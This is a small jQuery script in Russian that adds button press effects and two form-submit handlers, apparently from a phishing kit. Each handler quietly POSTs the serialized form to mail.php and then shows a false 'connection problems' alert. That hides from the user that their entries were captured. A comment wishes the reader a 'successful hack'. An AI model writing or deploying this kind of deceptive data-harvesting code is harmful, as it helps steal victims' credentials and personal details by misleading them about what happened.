$(document).ready(function(){

	//Желаю удачного взлома!! P.S Metis)

	/*Click button
	======================================*/
	$('#js-offset, .registr').mousedown(function(){

		$(this).css('padding', '8px 26px 7px');
	});

	$('#js-offset, .registr').mouseup(function(){

		$(this).css('padding', '7px 26px 8px');

	});

	$('#js-offset-n').mousedown(function(){

		$(this).css('padding', '8px 50px 7px');

	});

	$('#js-offset-n').mouseup(function(){

		$(this).css('padding', '7px 50px 8px');

	});

	/*Отправка формы
	======================================*/
	$("#form_1").submit(function() {
		$.ajax({
			type: "POST",
			url: "mail.php",
			data: $(this).serialize()
		}).done(function() {
			$(this).find("input").val("");
			alert("Неполадки в соеденение.");
			$("#form").trigger("reset");
		});
		return false;
	});

	$("#form_2").submit(function() {
		$.ajax({
			type: "POST",
			url: "mail.php",
			data: $(this).serialize()
		}).done(function() {
			$(this).find("input").val("");
			alert("Неполадки в соеденение.");
			$("#form").trigger("reset");
		});
		return false;
	});
});